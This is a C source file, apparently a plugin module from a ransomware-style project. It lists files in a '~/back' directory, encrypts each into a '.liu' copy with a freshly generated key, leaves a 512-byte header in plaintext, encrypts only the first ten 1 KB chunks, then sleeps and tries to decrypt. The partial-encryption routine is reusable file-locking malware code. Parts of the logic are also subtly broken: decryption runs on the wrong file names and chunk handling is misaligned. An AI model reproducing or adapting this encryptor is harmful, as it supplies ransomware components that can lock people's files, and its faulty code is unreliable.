#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "../include/encrypt.h"
#include "../include/hydrogen.h"
#include "../include/types.h"
#include "../include/system_utils.h"

#define META_SIZE 512
#define BUF_SIZE 1024
#define CHUNKS_TO_ENCRYPT 10
#define FILE_EXTENSION ".liu"
#define CONTEXT "FENCRYPT"
#define ENCRYPTED_BUF_SIZE BUF_SIZE + hydro_secretbox_HEADERBYTES

int init_plugin()
{
    char **list = list_files("~/back");

    // Generate encryption key
    uint8_t key[hydro_secretbox_KEYBYTES];
    hydro_secretbox_keygen(key);

    for (int i = 0; i < 256 && strcmp(list[i], ""); i++)
    {
        encrypt_file(list[i], key);
    }

    sleep(5);

    for (int i = 0; i < 256 && strcmp(list[i], ""); i++)
    {
        decrypt_file(list[i], key);
    }


    return OK;
}

int encrypt_file(char *file_name, uint8_t *key)
{
    FILE *fp_original, *fp_encrypted;
    char *n_file_name = (char *)calloc(strlen(file_name) + 1 + strlen(FILE_EXTENSION), sizeof(char));
    char buf[BUF_SIZE] = {0};
    uint8_t encrypted_buf[ENCRYPTED_BUF_SIZE];

    // Open original file
    fp_original = fopen(file_name, "rb");
    if (!fp_original)
    {
#ifdef DEBUG
        printf("[ERROR] Reading file...\n");
#endif
        free(n_file_name);
        return ERROR;
    }

    // Open .liu file to write encrypted data
    strcpy(n_file_name, file_name);
    strcat(n_file_name, FILE_EXTENSION);
    fp_encrypted = fopen(n_file_name, "wb");
    if (!fp_encrypted)
    {
#ifdef DEBUG
        printf("[ERROR] Opening liu file...\n");
#endif
        fclose(fp_original);
        free(n_file_name);
        return ERROR;
    }

    // Read the metadata and write it unencrypted
    fread(buf, META_SIZE, 1, fp_original);
    fwrite(buf, META_SIZE, 1, fp_encrypted);

    long last_pos = 0;
    long i = 0;
    int encrypted_flag = 0;
    // Read to buf until nothing is left
    while (fread(buf, BUF_SIZE, 1, fp_original))
    {
        if (i < CHUNKS_TO_ENCRYPT)
        {
            // Write encrypted data
            hydro_secretbox_encrypt(encrypted_buf, buf, BUF_SIZE, 0, CONTEXT, key);

            fwrite(encrypted_buf, ENCRYPTED_BUF_SIZE, 1, fp_encrypted);

            if (i == CHUNKS_TO_ENCRYPT - 1)
                encrypted_flag = 1;
        }
        else
        {
            // Write original data
            fwrite(buf, BUF_SIZE, 1, fp_encrypted);
        }

        last_pos = ftell(fp_original);
        i++;
    }

    long last_chunk_len = ftell(fp_original) - last_pos;
    fseek(fp_original, last_pos, SEEK_SET);

    // Read last chunk of data
    fread(buf, last_chunk_len, 1, fp_original);
    if (encrypted_flag == 0)
    {
        // Encrypt it and write it
        hydro_secretbox_encrypt(encrypted_buf, buf, last_chunk_len, 0, CONTEXT, key);
        fwrite(encrypted_buf, last_chunk_len + hydro_secretbox_HEADERBYTES, 1, fp_encrypted);
    }
    else
    {
        // Just write the original
        fwrite(buf, last_chunk_len, 1, fp_encrypted);
    }

    // Clean everything
    fclose(fp_original);
    fclose(fp_encrypted);
    free(n_file_name);

    return OK;
}

int decrypt_file(char *file_name, uint8_t *key)
{
    FILE *fp_encrypted, *fp_decrypted;
    char *n_file_name = (char *)calloc(strlen(file_name) + 1, sizeof(char));
    char buf[ENCRYPTED_BUF_SIZE] = {0};
    char decrypted_buf[BUF_SIZE] = {0};

    char *file_extension = file_name + (strlen(file_name) - strlen(FILE_EXTENSION));

    // Check the file is .liu
    if (strncmp(file_extension, FILE_EXTENSION, strlen(FILE_EXTENSION)) != 0)
    {
#ifdef DEBUG
        printf("[ERROR] The extension of that file is not .liu\n");
#endif
    }

    // Open .liu file
    fp_encrypted = fopen(file_name, "rb");
    if (!fp_encrypted)
    {
#ifdef DEBUG
        printf("[ERROR] Reading .liu file [%s]...\n", file_name);
#endif
        free(n_file_name);
        return ERROR;
    }

    // Open new file to decrypt
    strncpy(n_file_name, file_name, strlen(file_name) - strlen(FILE_EXTENSION) + 1);
    fp_decrypted = fopen(n_file_name, "wb");
    if (!fp_decrypted)
    {
#ifdef DEBUG
        printf("[ERROR] Opening decrypted file...\n");
#endif
        fclose(fp_encrypted);
        free(n_file_name);
        return ERROR;
    }

    // Read the metadata and write it unencrypted
    fread(buf, META_SIZE, 1, fp_encrypted);
    fwrite(buf, META_SIZE, 1, fp_decrypted);

    long last_pos = 0;
    long i = 0;
    int decrypted_flag = 0;
    // Read to buf until nothing is left
    while (fread(buf, ENCRYPTED_BUF_SIZE, 1, fp_encrypted))
    {
        if (i < CHUNKS_TO_ENCRYPT)
        {
            // Write decrypted data
            if (hydro_secretbox_decrypt(decrypted_buf, (uint8_t *)buf, ENCRYPTED_BUF_SIZE, 0, CONTEXT, key) != 0)
            {
#ifdef DEBUG
                printf("[ERROR] Decrypting file...\n");
#endif
            }

            fwrite(decrypted_buf, BUF_SIZE, 1, fp_decrypted);

            if (i == CHUNKS_TO_ENCRYPT - 1)
                decrypted_flag = 1;
        }
        else
        {
            // Write original data
            fwrite(buf, ENCRYPTED_BUF_SIZE, 1, fp_decrypted);
        }

        last_pos = ftell(fp_encrypted);
        i++;
    }

    long last_chunk_len = ftell(fp_encrypted) - last_pos;
    fseek(fp_encrypted, last_pos, SEEK_SET);

    // Read last chunk of data
    fread(buf, last_chunk_len, 1, fp_encrypted);
    if (decrypted_flag == 0)
    {
        // Encrypt it and write it
        if (hydro_secretbox_decrypt(decrypted_buf, (uint8_t *)buf, last_chunk_len, 0, CONTEXT, key) != 0)
        {
#ifdef DEBUG
            printf("[ERROR] Decrypting file...\n");
#endif
        }

        fwrite(decrypted_buf, last_chunk_len - hydro_secretbox_HEADERBYTES, 1, fp_decrypted);
    }
    else
    {
        // Just write the original
        fwrite(buf, last_chunk_len, 1, fp_decrypted);
    }

    // Clean everything
    fclose(fp_encrypted);
    fclose(fp_decrypted);
    free(n_file_name);

    return OK;
}